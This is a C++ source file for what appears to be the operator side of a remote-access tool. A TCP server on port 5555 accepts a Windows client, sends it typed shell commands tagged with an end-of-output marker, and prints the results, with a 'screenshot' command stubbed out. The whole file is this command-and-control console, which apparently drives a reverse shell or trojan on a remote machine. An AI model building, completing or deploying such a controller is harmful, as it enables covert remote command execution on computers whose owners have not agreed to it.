#include "TCPServer.h"

#include <array>
#include <cerrno>
#include <iostream>
#include <string>
#include <string_view>
#include <system_error>

int main() {
    try {
        TCPServer server(5555);
        if (!server.bindSocket() || !server.listenSocket()) return 1;
        auto client = server.acceptConnection();
        constexpr std::string_view marker = " & echo ### END OF OUTPUT ###";
        // Right now the Windows client reads at most 199 command bytes.
        constexpr std::size_t maxWireCommand = 199;
        std::array<char, 4096> response{};
        std::string command;
        while (std::cout << "Enter your command: " << std::flush,
               std::getline(std::cin, command)) {
            if (command == "quit") break;
            if (command.rfind("screenshot", 0) == 0) {
                std::cerr << "Screenshots are not implemented.\n";
                continue;
            }
            if (command.size() > maxWireCommand - marker.size() ||
                command.find('\0') != std::string::npos) {
                std::cerr << "Command exceeds the legacy limit or contains a NUL byte.\n";
                continue;
            }
            command.append(marker);
            std::size_t offset = 0;
            while (offset < command.size()) {
                const auto sent = send(client.get(), command.data() + offset,
                                       command.size() - offset, MSG_NOSIGNAL);
                if (sent < 0 && errno == EINTR) continue;
                if (sent < 0) throw std::system_error(errno, std::generic_category(), "send");
                if (sent == 0) throw std::runtime_error("send made no progress");
                offset += static_cast<std::size_t>(sent);
            }
            ssize_t received;
            do {
                received = recv(client.get(), response.data(), response.size(), 0);
            } while (received < 0 && errno == EINTR);
            if (received < 0) throw std::system_error(errno, std::generic_category(), "recv");
            if (received == 0) {
                std::cout << "Client disconnected.\n";
                break;
            }
            // Still one read per command: framing is TODO.
            std::cout.write(response.data(), static_cast<std::streamsize>(received));
            std::cout << std::flush;
        }
        return 0;
    } catch (const std::exception& error) {
        std::cerr << "Server: " << error.what() << '\n';
        return 1;
    }
}
